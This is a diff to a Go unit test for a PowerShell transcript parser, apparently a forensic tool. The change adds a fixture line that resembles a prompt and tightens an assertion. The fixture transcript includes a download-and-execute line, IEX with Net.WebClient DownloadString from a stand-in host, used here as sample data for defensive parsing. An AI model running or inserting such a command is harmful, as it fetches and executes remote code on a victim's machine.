@@ -39,6 +39,9 @@ func TestPowerShellTranscript(t *testing.T) {
 		"**********************\r\n" +
 		"PS C:\\Users\\alice> IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')\r\n" +
 		"PS>\r\n" +
+		// Output that looks like a prompt (an old transcript printed) is not a
+		// command: with headers on, every command has its block.
+		"PS C:\\old> Get-Process\r\n" +
 		"**********************\r\n" +
 		"Command start time: 20240117212459\r\n" +
 		"**********************\r\n" +
@@ -66,8 +69,8 @@ func TestPowerShellTranscript(t *testing.T) {
 	if e := r.events[4]; e.Type != "powershell-transcript-ended" || utc(e) != "2024-01-17T21:25:00Z" {
 		t.Errorf("end: %s %+v", utc(e), e)
 	}
-	if !strings.Contains(r.text, "DownloadString") || r.facts["powershell.transcript"] != "1 session(s), 3 command(s) with a time, 0 without" {
-		t.Errorf("text or fact: %q", r.facts["powershell.transcript"])
+	if !strings.Contains(r.text, "DownloadString") || r.facts["powershell.transcript"] != "1 session(s), 3 command(s) with a time, 0 without" || len(r.notes) != 0 {
+		t.Errorf("text or fact: %q, notes %q", r.facts["powershell.transcript"], r.notes)
 	}
 
 	// Without them, commands are text only, and the transcript says so. In
